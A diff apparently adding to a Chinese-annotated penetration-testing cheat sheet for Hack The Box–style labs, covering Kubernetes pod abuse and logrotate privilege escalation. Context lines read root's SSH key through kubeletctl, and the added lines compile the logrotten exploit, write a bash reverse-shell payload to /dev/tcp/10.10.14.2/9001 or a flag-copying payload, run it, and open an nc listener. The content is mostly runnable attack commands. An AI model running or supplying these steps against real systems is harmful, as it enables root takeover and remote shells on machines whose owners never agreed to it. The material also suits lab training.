@@ -180,3 +180,12 @@ spec:
 kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml            创建新 pod
 kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc                                  提取 root 密钥
 
+git clone https://github.com/whotwagner/logrotten.git
+  https://github.com/whotwagner/logrotten
+cd logrotten
+gcc logrotten.c -o logrotten
+echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload      或复制 flag.txt 内容到指定文件      echo "cat /root/flag.txt > /home/htb-student/flag.txt" > payload
+grep "create\|compress" /etc/logrotate.conf | grep -v "#"            查看确认 create 或 compress 可用
+./logrotten -p ./payload /tmp/tmp.log
+kali:~$ nc -nlvp 9001
+想办法触发日志轮转，例如不断写入 /tmp/tmp.log
